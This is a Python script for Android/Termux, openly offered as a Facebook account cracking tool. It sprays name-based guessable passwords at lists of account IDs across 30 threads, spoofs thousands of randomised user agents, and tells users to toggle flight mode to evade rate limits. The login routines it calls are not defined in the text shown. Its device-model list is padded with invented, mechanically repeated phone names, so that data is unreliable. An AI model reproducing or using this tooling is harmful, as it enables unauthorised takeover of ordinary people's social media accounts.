import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def clear():
    os.system('clear')
#------------------[ DARK-INTRO ]-------------------#
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update... ')
time.sleep(5)
os.system("git pull")
os.system('clear')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mInstalling modules... ')
time.sleep(5)
os.system("pkg install espeak")
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN OUR FACEBOOK GROUP")
time.sleep(5)
os.system(f'xdg-open https://www.facebook.com/groups/2477016825771219')
print()
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mFOLLOW MY GITHUB ACCOUNT")
time.sleep(5)
os.system(f'xdg-open https://github.com/coderet-d-looper')

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Dark.py')
#------------------[ DARK-USERAGENT ]-------------------#
except:pass
ugen = []
device_models = ['Samsung Galaxy S21', 'Samsung Galaxy S21+', 'Samsung Galaxy S21 Ultra',
    'Samsung Galaxy S20', 'Samsung Galaxy S20+', 'Samsung Galaxy S20 Ultra',
    'Samsung Galaxy S10', 'Samsung Galaxy S10+', 'Samsung Galaxy S10e',
    'Samsung Galaxy S9', 'Samsung Galaxy S9+', 'Samsung Galaxy S8', 'Samsung Galaxy S8+',
    'Samsung Galaxy Note 20', 'Samsung Galaxy Note 20 Ultra', 'Samsung Galaxy Note 10',
    'Samsung Galaxy Note 10+', 'Samsung Galaxy Note 9', 'Samsung Galaxy Note 8',
    'Samsung Galaxy A52', 'Samsung Galaxy A51', 'Samsung Galaxy A50', 'Samsung Galaxy A42',
    'Samsung Galaxy A41', 'Samsung Galaxy A40', 'Samsung Galaxy A32', 'Samsung Galaxy A31',
    'Samsung Galaxy A30', 'Samsung Galaxy A22', 'Samsung Galaxy A21s', 'Samsung Galaxy A20',
    'Samsung Galaxy A12', 'Samsung Galaxy A11', 'Samsung Galaxy A10', 'Samsung Galaxy A10s',
    'Samsung Galaxy M32', 'Samsung Galaxy M31', 'Samsung Galaxy M30', 'Samsung Galaxy M21',
    'Samsung Galaxy M12', 'Samsung Galaxy M11', 'Samsung Galaxy M10', 'Samsung Galaxy F41',
    'Samsung Galaxy F22', 'Samsung Galaxy F12', 'Samsung Galaxy F02s', 'Samsung Galaxy Z Fold 3',
    'Samsung Galaxy Z Flip 3', 'Samsung Galaxy Z Fold 2', 'Samsung Galaxy Z Flip',
    'Samsung Galaxy Fold', 'Samsung Galaxy Z Flip 5G', 'Samsung Galaxy Z Fold 5G',
    'Samsung Galaxy Z Fold FE', 'Samsung Galaxy Z Fold Lite', 'Samsung Galaxy Z Fold E',
    'Samsung Galaxy Z Fold M', 'Samsung Galaxy Z Fold C', 'Samsung Galaxy Xcover 5',
    'Samsung Galaxy Xcover Pro', 'Samsung Galaxy Xcover 4s', 'Samsung Galaxy Xcover 4',
    'Samsung Galaxy Xcover FieldPro', 'Samsung Galaxy Xcover FieldPro 2',
    'Samsung Galaxy Xcover 3', 'Samsung Galaxy Xcover Pro 2',
    'Samsung Galaxy Xcover Pro 3', 'Samsung Galaxy Xcover Pro 4', 'Samsung Galaxy Xcover Pro 5',
    'Samsung Galaxy Xcover Pro 6', 'Samsung Galaxy Xcover Pro 7', 'Samsung Galaxy Xcover Pro 8',
    'Samsung Galaxy Xcover Pro 9', 'Samsung Galaxy Xcover Pro 10', 'Samsung Galaxy Xcover Pro 11',
    'Samsung Galaxy Xcover Pro 12', 'Samsung Galaxy Xcover Pro 13', 'Samsung Galaxy Xcover Pro 14',
    'Samsung Galaxy Xcover Pro 15', 'Samsung Galaxy Xcover Pro 16', 'Samsung Galaxy Xcover Pro 17',
    'Samsung Galaxy Xcover Pro 18', 'Samsung Galaxy Xcover Pro 19', 'Samsung Galaxy Xcover Pro 20',
    'Samsung Galaxy Xcover Pro 21', 'Samsung Galaxy Xcover Pro 22', 'Samsung Galaxy Xcover Pro 23',
    'Samsung Galaxy Xcover Pro 24', 'Samsung Galaxy Xcover Pro 25', 'Samsung Galaxy Xcover Pro 26',
    'Samsung Galaxy Xcover Pro 27', 'Samsung Galaxy Xcover Pro 28', 'Samsung Galaxy Xcover Pro 29',
    'Samsung Galaxy Xcover Pro 30', 'Samsung Galaxy Xcover Pro 31', 'Samsung Galaxy Xcover Pro 32',
    'Samsung Galaxy Xcover Pro 33', 'Samsung Galaxy Xcover Pro 34', 'Samsung Galaxy Xcover Pro 35',
    'Samsung Galaxy Xcover Pro 36', 'Samsung Galaxy Xcover Pro 37', 'Samsung Galaxy Xcover Pro 38',
    'Samsung Galaxy Xcover Pro 39', 'Samsung Galaxy Xcover Pro 40', 'Samsung Galaxy Xcover Pro 41',
    'Samsung Galaxy Xcover Pro 42', 'Samsung Galaxy Xcover Pro 43', 'Samsung Galaxy Xcover Pro 44',
    'Samsung Galaxy Xcover Pro 45', 'Samsung Galaxy Xcover Pro 46', 'Samsung Galaxy Xcover Pro 47',
    'Samsung Galaxy Xcover Pro 48', 'Samsung Galaxy Xcover Pro 49', 'Samsung Galaxy Xcover Pro 50',
    'Samsung Galaxy Xcover Pro 51', 'Samsung Galaxy Xcover Pro 52', 'Samsung Galaxy Xcover Pro 53',
    'Samsung Galaxy Xcover Pro 54', 'Samsung Galaxy Xcover Pro 55', 'Samsung Galaxy Xcover Pro 56',
    'Samsung Galaxy Xcover Pro 57', 'Samsung Galaxy Xcover Pro 58', 'Samsung Galaxy Xcover Pro 59',
    'Samsung Galaxy Xcover Pro 60', 'Samsung Galaxy Xcover Pro 61', 'Samsung Galaxy Xcover Pro 62',
    'Samsung Galaxy Xcover Pro 63', 'Samsung Galaxy Xcover Pro 64', 'Samsung Galaxy Xcover Pro 65',
    'Samsung Galaxy Xcover Pro 66', 'Samsung Galaxy Xcover Pro 67', 'Samsung Galaxy Xcover Pro 68',
    'Samsung Galaxy Xcover Pro 69', 'Samsung Galaxy Xcover Pro 70', 'Samsung Galaxy Xcover Pro 71',
    'Samsung Galaxy Xcover Pro 72', 'Samsung Galaxy Xcover Pro 73', 'Samsung Galaxy Xcover Pro 74',
    'Samsung Galaxy Xcover Pro 75', 'Samsung Galaxy Xcover Pro 76', 'Samsung Galaxy Xcover Pro 77',
    'Samsung Galaxy Xcover Pro 78', 'Samsung Galaxy Xcover Pro 79', 'Samsung Galaxy Xcover Pro 80',
    'Samsung Galaxy Xcover Pro 81', 'Samsung Galaxy Xcover Pro 82', 'Samsung Galaxy Xcover Pro 83',
    'Samsung Galaxy Xcover Pro 84', 'Samsung Galaxy Xcover Pro 85', 'Samsung Galaxy Xcover Pro 86',
    'Samsung Galaxy Xcover Pro 87', 'Samsung Galaxy Xcover Pro 88', 'Samsung Galaxy Xcover Pro 89',
    'Samsung Galaxy Xcover Pro 90', 'Samsung Galaxy Xcover Pro 91', 'Samsung Galaxy Xcover Pro 92',
    'Samsung Galaxy Xcover Pro 93', 'Samsung Galaxy Xcover Pro 94', 'Samsung Galaxy Xcover Pro 95',
    'Samsung Galaxy Xcover Pro 96', 'Samsung Galaxy Xcover Pro 97', 'Samsung Galaxy Xcover Pro 98',
    'Samsung Galaxy Xcover Pro 99', 'Samsung Galaxy Xcover Pro 100' 'Infinix Zero X', 'Infinix Zero X Pro', 'Infinix Note 11', 'Infinix Note 11 Pro', 'Infinix Hot 11',
    'Infinix Hot 11S', 'Infinix Hot 11 Play', 'Infinix Note 11S', 'Infinix Hot 10', 'Infinix Hot 10S',
    'Infinix Hot 10 Play', 'Infinix Hot 10T', 'Infinix Note 10', 'Infinix Note 10 Pro', 'Infinix Note 10S',
    'Infinix Hot 9', 'Infinix Hot 9 Pro', 'Infinix Hot 9 Play', 'Infinix Hot 9T', 'Infinix Hot 8',
    'Infinix Hot 8 Lite', 'Infinix Hot 7', 'Infinix Hot 7 Pro', 'Infinix Hot 7 Lite', 'Infinix Note 7',
    'Infinix Note 7 Lite', 'Infinix Note 7P', 'Infinix Note 6', 'Infinix S5', 'Infinix S5 Pro',
    'Infinix S5 Lite', 'Infinix S4', 'Infinix S4 Pro', 'Infinix S3', 'Infinix S3X', 'Infinix Smart 5',
    'Infinix Smart 5A', 'Infinix Smart 4', 'Infinix Smart 4 Plus', 'Infinix Smart 3', 'Infinix Smart 3 Plus',
    'Infinix Smart HD 2021', 'Infinix Zero 8', 'Infinix Zero 8i', 'Infinix Zero 8 Lite', 'Infinix Zero 6',
    'Infinix Zero 6 Pro', 'Infinix Zero 5', 'Infinix Zero 5 Pro', 'Infinix Zero 4', 'Infinix Zero 4 Plus',
    'Infinix Zero 3', 'Infinix Zero 2', 'Infinix Zero 1', 'Infinix Hot 6', 'Infinix Hot 6 Pro',
    'Infinix Hot 6X', 'Infinix Hot 5', 'Infinix Hot 5 Lite', 'Infinix Hot 5 Pro', 'Infinix Hot 4',
    'Infinix Hot 4 Pro', 'Infinix Hot 4 Lite', 'Infinix Hot 3', 'Infinix Hot 3 LTE', 'Infinix Hot 2',
    'Infinix Hot S', 'Infinix Hot S2', 'Infinix Hot S2 Pro', 'Infinix Hot S3', 'Infinix Hot S3X',
    'Infinix Hot S4', 'Infinix Hot S5', 'Infinix Hot S5 Pro', 'Infinix Hot S6', 'Infinix Hot S6 Pro',
    'Infinix Hot S7', 'Infinix Hot S7 Pro', 'Infinix Hot S8', 'Infinix Hot S8 Pro', 'Infinix Note S',
    'Infinix Note S2', 'Infinix Note S3', 'Infinix Note S4', 'Infinix Note S5', 'Infinix Note S6',
    'Infinix Note S7', 'Infinix Note S8', 'Infinix Note S8 Pro', 'Infinix Note S9', 'Infinix Note S10',
    'Infinix Note S11', 'Infinix Note S12', 'Infinix Note S13', 'Infinix Note S14', 'Infinix Note S15',
    'Infinix Note S16', 'Infinix Note S17', 'Infinix Note S18', 'Infinix Note S19', 'Infinix Note S20',
    'Infinix Note S21', 'Infinix Note S22', 'Infinix Note S23', 'Infinix Note S24', 'Infinix Note S25',
    'Infinix Note S26', 'Infinix Note S27', 'Infinix Note S28', 'Infinix Note S29', 'Infinix Note S30',
    'Infinix Note S31', 'Infinix Note S32', 'Infinix Note S33', 'Infinix Note S34', 'Infinix Note S35',
    'Infinix Note S36', 'Infinix Note S37', 'Infinix Note S38', 'Infinix Note S39', 'Infinix Note S40',
    'Infinix Note S41', 'Infinix Note S42', 'Infinix Note S43', 'Infinix Note S44', 'Infinix Note S45',
    'Infinix Note S46', 'Infinix Note S47', 'Infinix Note S48', 'Infinix Note S49', 'Infinix Note S50', 'Poco X3 Pro', 'Poco F3', 'Poco X3 GT', 'Poco X3', 'Poco M3 Pro 5G', 'Poco F2 Pro', 'Poco M3', 'Poco X2',
    'Poco M2 Pro', 'Poco F1', 'Poco X3 NFC', 'Poco M2 Reloaded', 'Poco C3', 'Poco M3 5G', 'Poco M2', 'Poco M',
    'Poco X', 'Poco C', 'Poco C4', 'Poco M4', 'Poco M5', 'Poco X4', 'Poco F4', 'Poco F5', 'Poco X5', 'Poco X6',
    'Poco M6', 'Poco M7', 'Poco X7', 'Poco X8', 'Poco F6', 'Poco F7', 'Poco X9', 'Poco X10', 'Poco M8', 'Poco M9',
    'Poco X11', 'Poco X12', 'Poco F8', 'Poco F9', 'Poco X13', 'Poco X14', 'Poco M10', 'Poco M11', 'Poco X15',
    'Poco X16', 'Poco F10', 'Poco F11', 'Poco X17', 'Poco X18', 'Poco M12', 'Poco M13', 'Poco X19', 'Poco X20',
    'Poco F12', 'Poco F13', 'Poco X21', 'Poco X22', 'Poco M14', 'Poco M15', 'Poco X23', 'Poco X24', 'Poco F14',
    'Poco F15', 'Poco X25', 'Poco X26', 'Poco M16', 'Poco M17', 'Poco X27', 'Poco X28', 'Poco F16', 'Poco F17',
    'Poco X29', 'Poco X30', 'Poco M18', 'Poco M19', 'Poco X31', 'Poco X32', 'Poco F18', 'Poco F19', 'Poco X33',
    'Poco X34', 'Poco M20', 'Poco M21', 'Poco X35', 'Poco X36', 'Poco F20', 'Poco F21', 'Poco X37', 'Poco X38',
    'Poco M22', 'Poco M23', 'Poco X39', 'Poco X40', 'Poco F22', 'Poco F23', 'Poco X41', 'Poco X42', 'Poco M24',
    'Poco M25', 'Poco X43', 'Poco X44', 'Poco F24', 'Poco F25', 'Poco X45', 'Poco X46', 'Poco M26', 'Poco M27',
    'Poco X47', 'Poco X48', 'Poco F26', 'Poco F27', 'Poco X49', 'Poco X50', 'Poco M28', 'Poco M29', 'Poco X51',
    'Poco X52', 'Poco F28', 'Poco F29', 'Poco X53', 'Poco X54', 'Poco M30', 'Poco M31', 'Poco X55', 'Poco X56',
    'Poco F30', 'Poco F31', 'Poco X57', 'Poco X58', 'Poco M32', 'Poco M33', 'Poco X59', 'Poco X60', 'Poco F32',
    'Poco F33', 'Poco X61', 'Poco X62', 'Poco M34', 'Poco M35', 'Poco X63', 'Poco X64', 'Poco F34', 'Poco F35',
    'Poco X65', 'Poco X66', 'Poco M36', 'Poco M37', 'Poco X67', 'Poco X68', 'Poco F36', 'Poco F37', 'Poco X69',
    'Poco X70', 'Poco M38', 'Poco M39', 'Poco X71', 'Poco X72', 'Poco F38', 'Poco F39', 'Poco X73', 'Poco X74',
    'Poco M40', 'Poco M41', 'Poco X75', 'Poco X76', 'Poco F40', 'Poco F41', 'Poco X77', 'Poco X78', 'Poco M42',
    'Poco M43', 'Poco X79', 'Poco X80', 'Poco F42', 'Poco F43', 'Poco X81', 'Poco X82', 'Poco M44', 'Poco M45',
    'Poco X83', 'Poco X84', 'Poco F44', 'Poco F45', 'Poco X85', 'Poco X86', 'Poco M46', 'Poco M47', 'Poco X87',
    'Poco X88', 'Poco F46', 'Poco F47', 'Poco X89', 'Poco X90', 'Poco M48', 'Poco M49', 'Poco X91', 'Poco X92',
    'Poco F48', 'Poco F49', 'Poco X93', 'Poco X94', 'Poco M50', 'Poco M51', 'Poco X95', 'Poco X96', 'Poco F50',
    'Poco F51', 'Poco X97', 'Poco X98', 'Poco M52', 'Poco M53', 'Poco X99', 'Poco X100', 'Poco F52', 'Poco F53',
    'Poco X101', 'Poco X102', 'Poco M54', 'Poco M55', 'Poco X103', 'Poco X104', 'Poco F54', 'Poco F55', 'Acer Liquid Z220', 'Acer Liquid Z320', 'Acer Liquid Z330', 'Acer Liquid Z410', 'Acer Liquid Z500',
    'Acer Liquid Z520', 'Acer Liquid Z530', 'Acer Liquid Z530S', 'Acer Liquid Z630', 'Acer Liquid Z630S',
    'Acer Liquid Zest', 'Acer Liquid Zest 4G', 'Acer Liquid Zest Plus', 'Acer Liquid Z6', 'Acer Liquid Z6 Plus',
    'Acer Liquid Z6E', 'Acer Liquid Z6 Plus Limited Edition', 'Acer Liquid Z6E Plus', 'Acer Liquid X1',
    'Acer Liquid X2', 'Acer Liquid X2 Duo', 'Acer Liquid X2 S59', 'Acer Liquid X2 T03', 'Acer Liquid X2 T03 S59',
    'Acer Liquid X2 T03 S59F', 'Acer Liquid X2 T03 S59M', 'Acer Liquid X2 T03 S59R', 'Acer Liquid X2 T03 S59T',
    'Acer Liquid X2 T03 S59Y', 'Acer Liquid X2 V59', 'Acer Liquid X2 V59 S59', 'Acer Liquid X2 V59 S59F',
    'Acer Liquid X2 V59 S59M', 'Acer Liquid X2 V59 S59R', 'Acer Liquid X2 V59 S59T', 'Acer Liquid X2 V59 S59Y',
    'Acer Liquid X2 V59 T03', 'Acer Liquid X2 V59 T03 S59', 'Acer Liquid X2 V59 T03 S59F', 'Acer Liquid X2 V59 T03 S59M',
    'Acer Liquid X2 V59 T03 S59R', 'Acer Liquid X2 V59 T03 S59T', 'Acer Liquid X2 V59 T03 S59Y', 'Acer Liquid X2 V59 T03 S59YU',
    'Acer Liquid X2 V59 X2', 'Acer Liquid X2 V59 X2 S59', 'Acer Liquid X2 V59 X2 S59F', 'Acer Liquid X2 V59 X2 S59M',
    'Acer Liquid X2 V59 X2 S59R', 'Acer Liquid X2 V59 X2 S59T', 'Acer Liquid X2 V59 X2 S59Y', 'Acer Liquid X2 V59 X2 S59YU',
    'Acer Liquid X2 V59 X2 T03', 'Acer Liquid X2 V59 X2 T03 S59', 'Acer Liquid X2 V59 X2 T03 S59F',
    'Acer Liquid X2 V59 X2 T03 S59M', 'Acer Liquid X2 V59 X2 T03 S59R', 'Acer Liquid X2 V59 X2 T03 S59T',
    'Acer Liquid X2 V59 X2 T03 S59Y', 'Acer Liquid X2 V59 X2 T03 S59YU', 'Acer Liquid X2 V59 X2 T03 V59',
    'Acer Liquid X2 V59 X2 T03 V59 S59', 'Acer Liquid X2 V59 X2 T03 V59 S59F', 'Acer Liquid X2 V59 X2 T03 V59 S59M',
    'Acer Liquid X2 V59 X2 T03 V59 S59R', 'Acer Liquid X2 V59 X2 T03 V59 S59T', 'Acer Liquid X2 V59 X2 T03 V59 S59Y',
    'Acer Liquid X2 V59 X2 T03 V59 S59YU', 'Acer Liquid X2 V59 X2 T03 V59 X2', 'Acer Liquid X2 V59 X2 T03 V59 X2 S59',
    'Acer Liquid X2 V59 X2 T03 V59 X2 S59F', 'Acer Liquid X2 V59 X2 T03 V59 X2 S59M', 'Acer Liquid X2 V59 X2 T03 V59 X2 S59R',
    'Acer Liquid X2 V59 X2 T03 V59 X2 S59T', 'Acer Liquid X2 V59 X2 T03 V59 X2 S59Y', 'Acer Liquid X2 V59 X2 T03 V59 X2 S59YU',
    'Acer Liquid X2 V59 X2 T03 V59 X2 T03', 'Acer Liquid X2 V59 X2 T03 V59 X2 T03 S59',
    'Acer Liquid X2 V59 X2 T03 V59 X2 T03 S59F', 'Acer Liquid X2 V59 X2 T03 V59 X2 T03 S59M',
    'Acer Liquid X2 V59 X2 T03 V59 X2 T03 S59R', 'Acer Liquid X2 V59 X2 T03 V59 X2 T03 S59T',
    'Acer Liquid X2 V59 X2 T03 V59 X2 T03 S59Y', 'Acer Liquid X2 V59 X2 T03 V59 X2 T03 S59YU',
    'Acer Liquid X2 V59 X2 T03 V59 X2 V59', 'Acer Liquid X2 V59 X2 T03 V59 X2 V59 S59',
    'Acer Liquid X2 V59 X2 T03 V59 X2 V59 S59F', 'Acer Liquid X2 V59 X2 T03 V59 X2 V59 S59M',
    'Acer Liquid X2 V59 X2 T03 V59 X2 V59 S59R', 'Acer Liquid X2 V59 X2 T03 V59 X2 V59 S59T',
    'Acer Liquid X2 V59 X2 T03 V59 X2 V59 S59Y', 'Acer Liquid X2 V59 X2 T03 V59 X2 V59 S59YU',
    'Acer Liquid X2 V59 X2 T03 V59 X2 T03 V59', 'Acer Liquid X2 V59 X2 T03 V59 X2 T03 V59 S59',
    'Acer Liquid X2 V59 X2 T03 V59 X2 T03 V59 S59F', 'Acer Liquid X2 V59 X2 T03 V59 X2 T03 V59 S59M',
    'Acer Liquid X2 V59 X2 T03 V59 X2 T03 V59 S59R', 'Acer Liquid X2 V59 X2 T03 V59 X2 T03 V59 S59T', 'Asus ROG Phone 5', 'Asus ZenFone 8', 'Asus ZenFone 7', 'Asus ZenFone 6', 'Asus ZenFone 5', 'Asus ZenFone 4',
    'Asus ROG Phone 3', 'Asus ROG Phone 2', 'Asus ROG Phone', 'Asus ZenFone 3 Deluxe', 'Asus ZenFone 3 Ultra',
    'Asus ZenFone 3 Laser', 'Asus ZenFone 3 Max', 'Asus ZenFone 3 Zoom', 'Asus ZenFone 3', 'Asus ZenFone 3s Max',
    'Asus ZenFone 3 Go', 'Asus ZenFone 3 Max Plus', 'Asus ZenFone 2 Deluxe', 'Asus ZenFone 2 Laser',
    'Asus ZenFone 2 Selfie', 'Asus ZenFone 2E', 'Asus ZenFone 2', 'Asus ZenFone Selfie', 'Asus ZenFone Zoom',
    'Asus ZenFone 6 Edition 30', 'Asus ROG Phone II Ultimate Edition', 'Asus ROG Phone II Strix Edition',
    'Asus ZenFone Live (L1)', 'Asus ZenFone 5Z', 'Asus ZenFone 5 Lite', 'Asus ZenFone 5 Selfie Pro',
    'Asus ZenFone 5 Selfie', 'Asus ZenFone 5 Max', 'Asus ZenFone 5Q', 'Asus ZenFone 4 Pro', 'Asus ZenFone 4 Selfie Pro',
    'Asus ZenFone 4 Selfie', 'Asus ZenFone 4 Max Pro', 'Asus ZenFone 4 Max Plus', 'Asus ZenFone 4 Max',
    'Asus ZenFone 4 Live'
]

for _ in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; '
    device_model = random.choice(device_models)
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    full_agent = f'{aa} {b}; {c}{device_model}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(full_agent)

#------------------[ DARK-UNKNOWN ]-------------------#
sim_id = ''
android_version = subprocess.check_output(
    'getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output(
    'getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output(
    'getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
        'utf-8').split(',')[0].replace('\n', '')
except:
    fbcr = 'Zong'
fbmf = subprocess.check_output(
    'getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output(
    'getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode(
    'utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace(
    '\n', '')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')
try:
    fbcr = subprocess.check_output(
        'getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
    total = 0
    for i in fbcr:
        total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
            'utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
    elif select == '2':
        try:
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
                'utf-8').split(',')[1].replace('\n', '')
            sim_id += fbcr
        except Exception as e:
            fbcr = "Zong"
            sim_id += fbcr
    else:
        fbcr = 'Zong'
        sim_id += fbcr
except:
    fbcr = "Zong"
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm}

#------------------[ DARK-LOGO ]-------------------#
logo = ("""

██████╗░░█████╗░██████╗░██╗░░██╗        ███████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝        ╚════██║
██║░░██║███████║██████╔╝█████═╝░        ░░███╔═╝
██║░░██║██╔══██║██╔══██╗██╔═██╗░        ██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░╚██╗        ███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝        ╚══════╝

\033[1;91m\033[1;41m\033[1;97m              Be you, The world will adjust               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[👨] AUTHOR    :\033[1;32m DARK X FUZED 
\033[1;32m[📖] GITHUB    :\033[1;32m CODERET-D-LOOPER
\033[1;32m[😇] FACEBOOK  :\033[1;32m FIRDAWS SAPNO
\033[1;32m[💉] TOOLS     :\033[1;32m PREMIUM
\033[1;32m[📅] VERSION   :\033[1;32m 3.8 [DEXA-G]
\033[1;32m[🚀] STATUS    :\033[1;32m WORKING
\033[1;32m[⏳] UPDATE    :\033[1;32m EVERYDAY AT 12.00AM
\033[1;91m<═══\033[1;41m\033[1;97m WORKING ONLY ON MOBILE DATA\033[;0m\033[1;91m═══>\033[1;92m
\033[1;92m══════════════════════════════════════════""")

def linex():
    print('\033[1;92m══════════════════════════════════════════')

def clear():
    os.system('clear')
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []

#------------------[ DARK-MENU ]-------------------#
def menu():
    try:
        clear()
        if 1 == 1:
            clear()
            os.system('espeak -a 300 " Welcome,   to,  DARK,  Z,  Tools"')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            print('\033[1;37m[01] FILE CLONING\n\033[1;37m[02] RANDOM CLONING [WORKING]\n\033[1;37m[03] VISIT MY ACCOUNT\n\033[1;37m[04] CLOSE TOOL')
            print(
            "\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
            xd = input('\033[1;37m[💥] CHOOSE : ')
            if xd in ['1', '01']:
                clear()
                os.system('espeak -a 300 " Enter, your, file , name"')
                print('\033[1;32m[PUT FILE EXAMPLE:  /sdcard/DARK.txt  Etc...]')
                file = input('\033[1;37m[📂] INPUT FILE NAME: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    os.system('espeak -a 300 " File, location, not, found"')
                    print('[❌] FILE LOCATION NOT FOUND [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] METHOD 1 [BEST WORKING]\n[2] METHOD 2')
                os.system('espeak -a 300 " Choose, method, for, cloning"')
                linex()
                mthd = input('\033[1;32m[+] CHOOSE : ')
                linex()
                plist = []
                print('\033[1;37m           SELECT CRACK MENU')
                linex()
                print('[1] AUTO PASSWORD [BEST]\n[2] MANUAL PASSWORD')
                linex()
                ppp = input('\033[1;32m[+] CHOOSE : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first1122')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('first12')
                    plist.append('first111')
                    plist.append('first11')
                    plist.append('i love you')
                    plist.append('last')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m EXAMPLE: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] PUT PASSWORD {i+1}: '))
                linex()
                print('[🍬]SHOW CP ACCOUNT? (Y/n): ')
                linex()
                cx = input(' CHOOSE: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[🧮] TOTAL ID : \033[1;32m'+total_ids)
                    print("\033[1;35m[🚄] CRACKING SPEED - FAST✅ ")
                    print("\033[1;33m[🔍] CRACKING HAS BEEN STARTED")
                    linex()
                    print("""\033[1;91m<═══\033[1;41m\033[1;97m ✈ USE FLIGHT MODE IN EVERY 5 MIN\033[;0m\033[1;91m═══>\033[1;92m""")
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                        else:
                            crack_submit.submit(api1, ids, names, passlist)
                print('\033[1;37m')
                linex()
                os.system('espeak -a 300 " Cracking, has, completed"')
                print('[😘]CRACKING HAS COMPLETED')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                os.system('espeak -a 300 " press, enter, for, main, menu"')
                input('[👉]PRESS ENTER FOR MAIN MENU[👈]')
                os.system('python Dark.py')
            elif xd in ['3', '03']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1] Bangladesh cloning \n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    bd()
                if xd in ['0', '00']:
                    menu()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python Dark.py')
            linex()
            exit()
    except ValueError:
        exit()
